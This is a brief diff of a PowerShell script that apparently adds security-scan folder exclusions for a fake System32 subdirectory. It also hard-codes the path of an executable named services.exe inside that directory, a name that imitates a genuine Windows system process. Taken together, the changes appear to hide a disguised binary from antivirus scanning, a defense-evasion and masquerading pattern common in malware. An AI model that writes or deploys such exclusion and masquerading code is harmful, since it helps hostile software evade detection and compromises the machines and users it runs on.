@@ -16,6 +16,7 @@ function Add-FolderExclusions {
     $foldersToExclude = @(
         "C:\Windows\System32\SubDirectory\",
         "C:\Windows\System32\SubDir",
+	"C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\",
         "$env:APPDATA\SubDir"  # Dynamically gets the current user's AppData path
     )
 
@@ -201,7 +202,7 @@ function Validate-ExeFile {
 }
 
 # Prompt the user for the program location
-$programPath = C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe
+$programPath = "C:\Windows\System32\SubDirectory\SECURITYCLIENT\git\base\services.exe"
 
 # Validate the provided path
 if (-not (Validate-ExeFile -FilePath $programPath)) {
